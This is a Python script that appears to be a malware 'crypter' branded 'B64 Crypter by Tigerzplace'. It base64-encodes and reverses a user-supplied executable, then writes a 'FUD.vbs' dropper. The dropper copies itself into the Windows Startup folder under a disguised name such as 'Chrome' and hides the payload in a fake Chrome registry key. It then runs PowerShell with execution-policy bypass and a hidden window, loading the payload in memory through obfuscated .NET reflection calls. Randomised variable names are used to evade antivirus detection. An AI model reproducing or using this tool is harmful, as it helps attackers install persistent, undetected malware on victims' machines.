import base64
import string
import random
import time
import sys


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


blur = dict()
base64_string = ""
banner = '''

888888b.    .d8888b.      d8888        .d8888b.                            888                    
888  "88b  d88P  Y88b    d8P888       d88P  Y88b                           888                    
888  .88P  888          d8P 888       888    888                           888                    
8888888K.  888d888b.   d8P  888       888        888d888 888  888 88888b.  888888 .d88b.  888d888 
888  "Y88b 888P "Y88b d88   888       888        888P"   888  888 888 "88b 888   d8P  Y8b 888P"   
888    888 888    888 8888888888      888    888 888     888  888 888  888 888   88888888 888     
888   d88P Y88b  d88P       888       Y88b  d88P 888     Y88b 888 888 d88P Y88b. Y8b.     888     
8888888P"   "Y8888P"        888        "Y8888P"  888      "Y88888 88888P"   "Y888 "Y8888  888     
                                                              888 888                             
                                                         Y8b d88P 888                             
                                                          "Y88P"  888            ~~ by Tigerzplace                         
'''


def randomize(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def loading():

    #animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    animation = ["Encrypting...:[■□□□□□□□□□]", "Encrypting...:[■■□□□□□□□□]", "Encrypting...:[■■■□□□□□□□]", "Encrypting...:[■■■■□□□□□□]", "Encrypting...:[■■■■■□□□□□]", "Encrypting...:[■■■■■■□□□□]", "Encrypting...:[■■■■■■■□□□]", "Encrypting...:[■■■■■■■■□□]", "Encrypting...:[■■■■■■■■■□]", "Completed :[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.1)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
    print("\n")


def confuse(w_list):
    blur['C'] = random.choice(w_list)
    blur['L'] = random.choice(w_list)
    blur['E'] = random.choice(w_list)
    blur['V'] = random.choice(w_list)
    blur['obj'] = random.choice(w_list)
    blur['fso'] = random.choice(w_list)
    blur['B64'] = random.choice(w_list)
    blur['RegK'] = random.choice(w_list)
    blur['sync'] = random.choice(w_list)
    blur['startPath'] = random.choice(w_list)
    blur['text'] = "$" + random.choice(w_list)
    blur['currentPath'] = random.choice(w_list)
    return blur


""" blur['C'] = "c" + randomize()
    blur['L'] = "l" + randomize()
    blur['E'] = "e" + randomize()
    blur['V'] = "v" + randomize()
    blur['RegK'] = "r" + randomize()
    blur['sync'] = "s" + randomize()
    blur['text'] = "$" + randomize()"""

print(banner)

try:
    try:
        file = input("\nFile (Payload.exe): ")
        if file.count(" "):
            input("\nPath shouldn't have space(s) in it.\nTry to load file from another path.")
            exit()
        simple_file = open(file, 'rb')  # read as binary rb
        binary_file_data = simple_file.read()
        base64_encoded_data = base64.b64encode(binary_file_data)
        base64_string = base64_encoded_data.decode('utf-8').replace("\n", "").replace(" ", "")[::-1]
        # file_64_encode = base64.encodebytes(payload_read)
        simple_file.close()
    except Exception as e:
        exit('{}'.format(e))

    try:
        wordlist = open('words.txt', 'r')
        words = list(set(wordlist.read().split("\n")))
        confuse = confuse(words)
    except Exception as e:
        print(e)

    startup = input("Startup name (e.g: Chrome): ")
    if startup == "":
        exit("Startup name can't be empty")
    power_shell = "On Error Resume Next\n" \
                  "For x = 0 To 5\n     "\
                  "WScript.Sleep(1000)\n   " \
                  "Next\n\n" \
                  "" + confuse['B64'] + "  = \"" + base64_string + "\" \n\n" \
                  "Set " + confuse['obj'] + " = CreateObject(\"Wscript.Shell\") \n" \
                  "Set " + confuse['fso'] + " = CreateObject(\"Scripting.FileSystemObject\")\n\n " \
                  "" + confuse['startPath'] + " = " + confuse['obj'] + ".SpecialFolders(\"Startup\") & \"\\" + startup + ".vbs\" \n" \
                  "" + confuse['currentPath'] + " = " + confuse['fso'] + ".GetAbsolutePathName(wscript.scriptfullname)\n" \
                  "" + confuse['RegK'] + " = \"HKCU\\SOFTWARE\\Chrome\\Updates\" \n\n\n" \
                  "if " + confuse['obj'] + ".RegRead(" + confuse['RegK'] + ") <> " + confuse['B64'] + " then\n" \
                  "" + confuse['obj'] + ".RegWrite " + confuse['RegK'] + ", " + confuse['B64'] + " \n" \
                  "end if\n\n\n" \
                  "" + confuse['sync'] + " = \"powershell -noexit -exec bypass -window 1 -Command Copy-Item '\" & " + confuse['currentPath'] + "  & \"' '\" & " + confuse['startPath'] + "  & \"';  " \
                  "" + confuse['text'] + " = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  " + confuse['text'] + " = -join " + confuse['text'] + "[-1..-" + confuse['text'] + ".Length];" \
                  "[<##>AppDomain<##>]::<##>('" + confuse['C'] + "urrentDomain'.replace('" + confuse['C'] + "','C'))<##>.<##>('" + confuse['L'] + "oad'.replace('" + confuse['L'] + "','L'))([Convert]::FromBase64String(" + confuse['text'] + "))<##>.<##>('" + confuse['E'] + "ntryPoint'.replace('" + confuse['E'] + "','E'))<##>." \
                  "<##>('In" + confuse['V'] + "oke'.replace('" + confuse['V'] + "','v'))($Null,$Null)<##>;\"  \n\n" \
                  "" + confuse['obj'] + ".Run " + confuse['sync'] + ", 0, False"
    try:
        fud = open('FUD.vbs', 'w')
        fud.write(power_shell)
        fud.close()
        #loading()
        input("Encrypted file created!!!")

    except Exception as e:
        exit('{}'.format(e))
except Exception as e:
    exit('{}'.format(e))
